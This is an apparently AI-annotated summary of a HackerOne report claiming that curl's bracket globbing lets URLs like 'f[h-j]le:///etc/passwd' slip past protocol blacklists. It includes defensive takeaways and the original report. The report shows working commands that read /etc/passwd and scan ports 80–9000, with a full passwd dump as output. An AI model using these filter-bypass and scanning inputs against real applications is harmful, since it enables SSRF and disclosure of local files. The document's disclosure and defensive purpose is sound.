# URI Path Glob Expansion in curl Allows Security Filter Bypass

## Metadata
- **Source:** HackerOne
- **Report:** 1566462 | https://hackerone.com/reports/1566462
- **Submitted:** 2022-05-12
- **Reporter:** iylz
- **Program:** curl
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Security Filter Bypass, SSRF (Server-Side Request Forgery), Local File Inclusion (LFI), Information Disclosure
- **CVEs:** None
- **Category:** uncategorised

## Summary
curl improperly expands glob patterns in URI paths, allowing attackers to bypass protocol blacklists and security filters. By using bracket notation (e.g., 'f[h-j]le:///etc/passwd'), an attacker can construct URLs that expand to valid protocols like 'file://', circumventing SSRF/LFI protections and accessing restricted resources.

## Attack scenario
1. Attacker identifies that a web application uses curl to fetch URLs and enforces a blacklist blocking the 'file://' protocol
2. Attacker crafts a malicious URL using glob patterns: 'f[h-j]le:///etc/passwd' which expands to 'file:///etc/passwd'
3. curl's URI parser expands the glob pattern and generates multiple requests, including one with the 'file://' protocol
4. The blacklist filter only checks the original user-provided URL and does not catch the expanded glob pattern
5. curl successfully parses the expanded 'file://' URL and reads sensitive local files like /etc/passwd
6. Attacker gains unauthorized access to sensitive information or can scan internal ports using similar glob patterns for port ranges

## Root cause
curl's URI parser expands glob patterns (bracket notation) at the protocol/host level before protocol validation and security filtering occurs. The glob expansion happens during URL parsing rather than treating special characters as literal path components, allowing bypass of security controls that operate on the original URL string.

## Attacker mindset
An attacker would target applications that use curl with security filters or blacklists, recognizing that glob pattern expansion can circumvent string-based filtering mechanisms. The attacker exploits the assumption that the URL parser respects security boundaries established by the application layer.

## Defensive takeaways
- Implement URL validation at the application level AFTER curl's internal parsing, not just on the raw input string
- Use a URL whitelist rather than blacklist approach for protocol restrictions
- Disable glob expansion in curl by using appropriate flags/options if available
- Validate the final resolved protocol and destination after all URL processing
- Apply defense-in-depth: use network-level controls (egress filtering) to restrict file:// and internal network access regardless of application logic
- Regularly update curl to patch URI parsing vulnerabilities
- For SSRF protection, implement strict hostname/IP validation against a whitelist combined with protocol restrictions

## Variant hunting
Look for similar glob expansion issues in URL parsing of other protocols (gopher://, dict://, etc.). Investigate whether bracket notation works with other glob constructs (e.g., wildcards, character ranges). Test if curl glob expansion can bypass other security mechanisms in applications using curl as a library. Check if similar patterns affect other HTTP client libraries (libcurl wrappers).

## MITRE ATT&CK
- T1190
- T1105
- T1040
- T1087

## Notes
The vulnerability demonstrates a fundamental issue with performing security checks on pre-parsed input rather than post-parsed output. Unlike wget, curl expands glob patterns in URLs, creating a semantic gap between what security filters see and what curl actually requests. This is particularly dangerous in SSRF contexts where applications trust their input validation but curl silently expands patterns.

## Full report
<details><summary>Expand</summary>

## Summary:
[add summary of the vulnerability]

The uri path error could lead to security filter bypasses. 
For example, 
we can use  curl  -vv 'f[h-j]le:///etc/passwd' to bypass  file protocol  black list
we can use  curl  -vv 'http://1.1.1.1:[80-9000]' to scan the open port in the host
etc ...

## Steps To Reproduce:
[add details for how we can reproduce the issue]

curl -vv 'f[h-j]le:///etc/passwd' will  parse 3 request , like  curl -vv 'fhle:///etc/passwd' 、curl -vv 'file:///etc/passwd' 、curl -vv 'fjle:///etc/passwd' 
```
[root@iz2ze9awqx4bwtc7j5q4hsz bin]# ./curl -Version
curl 7.83.1 (x86_64-pc-linux-gnu) libcurl/7.83.1 zlib/1.2.7
Release-Date: 2022-05-11
Protocols: dict file ftp gopher http imap mqtt pop3 rtsp smtp telnet tftp 
Features: alt-svc AsynchDNS IPv6 Largefile libz UnixSockets
[root@iz2ze9awqx4bwtc7j5q4hsz bin]# ./curl -vv 'f[h-j]le:///etc/passwd'
* Protocol "fhle" not supported or disabled in libcurl
* Closing connection -1
curl: (1) Protocol "fhle" not supported or disabled in libcurl
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-bus-proxy:x:999:998:systemd Bus Proxy:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
admin:x:1000:1000::/home/admin:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
workftp:x:1002:1003::/home/work/ftp/:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
* Closing connection 0
* Protocol "fjle" not supported or disabled in libcurl
* Closing connection -1
curl: (1) Protocol "fjle" not supported or disabled in libcurl
[root@iz2ze9awqx4bwtc7j5q4hsz bin]# wget 'f[h-j]le:///etc/passwd'
f[h-j]le:///etc/passwd: 地址缺少协议类型.
[root@iz2ze9awqx4bwtc7j5q4hsz bin]# 
```

So, I think this is a security questions of  curl, because the wget doesn't have same question. Thinks 

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

bypass the security filter like the SSRF/RFL/LFI  etc.

</details>

---
*Analysed by Claude on 2026-05-24*
